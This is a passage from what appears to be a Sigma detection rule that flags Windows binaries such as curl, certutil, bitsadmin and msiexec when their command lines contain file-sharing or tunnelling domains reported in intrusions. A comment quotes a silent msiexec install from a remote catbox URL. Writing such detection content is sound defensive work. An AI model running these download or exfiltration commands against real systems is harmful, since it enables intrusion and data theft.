    - attack.exfiltration
    - attack.t1537
    - attack.t1567.002
    - attack.command_and_control
    - attack.t1105
    - attack.t1071.001
  logsource:
      category: process_creation
      product: windows
  detection:
      selection_procs:
          Image|endswith:
              - 'curl.exe' # https://www.zscaler.com/blogs/security-research/memory-loader-drops-screenconnect; https://www.security.com/threat-intelligence/swallowtail-russia-nato-targets
              - 'pwsh.exe'
              - 'cmd.exe'
              - 'powershell.exe'
              - 'appinstaller.exe'
              - 'bitsadmin.exe'
              - 'certoc.exe'
              - 'certreq.exe'
              - 'certutil.exe'
              - 'cmdl32.exe'
              - 'configsecuritypolicy.exe'
              - 'desktopimgdownldr.exe'
              - 'devtunnel.exe'
              - 'diantz.exe'
              - 'esentutl.exe'
              - 'excel.exe'
              - 'expand.exe'
              - 'extrac32.exe'
              - 'findstr.exe'
              - 'finger.exe'
              - 'ftp.exe'
              - 'hh.exe'
              - 'ieexec.exe'
              - 'imewdbld.exe'
              - 'installutil.exe'
              - 'ldifde.exe'
              - 'makecab.exe'
              - 'mpcmdrun.exe'
              - 'msaccess.exe'
              - 'msiexec.exe' #msiexec /q /i hxxps://files.catbox[.]moe/tmp9fc.msi; https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://www.elastic.co/security-labs/solarwinds-whd-exploitation
              - 'msedge_proxy.exe'
              - 'mshta.exe'
              - 'msohtmed.exe'
              - 'mspub.exe'
              - 'msxsl.exe'
              - 'ngen.exe'
              - 'onedrivestandaloneupdater.exe'
              - 'powerpnt.exe'
              - 'presentationhost.exe'
              - 'printbrm.exe'
              - 'protocolhandler.exe'
              - 'replace.exe'
              - 'squirrel.exe'
              - 'update.exe'
              - 'visio.exe'
              - 'vslaunchbrowser.exe'
              - 'winget.exe'
              - 'winproj.exe'
              - 'winword.exe'
              - 'wsl.exe'
              - 'xsd.exe'
              - 'xwizard.exe'
      selection_domains:
          CommandLine|contains:
              - 'sendit.sh' # https://www.security.com/threat-intelligence/iran-seedworm-electronics
              - 'loophole.site'
              - 'loophole.cloud'
              - 'workers.dev'
              - 'glot.io' #https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html
              - 'filen.io' #https://cert.gov.ua/article/6287250; CERT-UA#19542
              - 'filen.dev' #https://cert.gov.ua/article/6287250; CERT-UA#19542
              - 'filen.net' #https://cert.gov.ua/article/6287250; CERT-UA#19542
              - 'secfileshare.com' #https://cert.gov.ua/article/6284949
              - 'qaz.im' #CERT-UA#11776
              - 'qaz.is' #CERT-UA#11776
              - 'qaz.su' #CERT-UA#11776
              - 'filedn.eu'
              - 'onehub.com' #https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/
              - 'terabox.com'
              - 'egnyte.com' #ttps://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/
              - 'sync.com'
              - 'filebin.net'
              - 'keep.sh'
              - 'gitea.com'
              - 'oshi.at' #OshiUpload
              - 'ipapi.co' #CERT-UA#7469, but noizy.
              - 'files.catbox.moe' #CERT-UA#6995, CERT-UA#7183
              - 'bayfiles.com'
              - 'usrfiles.com'
              - 'dropbox.com' # https://www.security.com/blog-post/stock-exchange-espionage
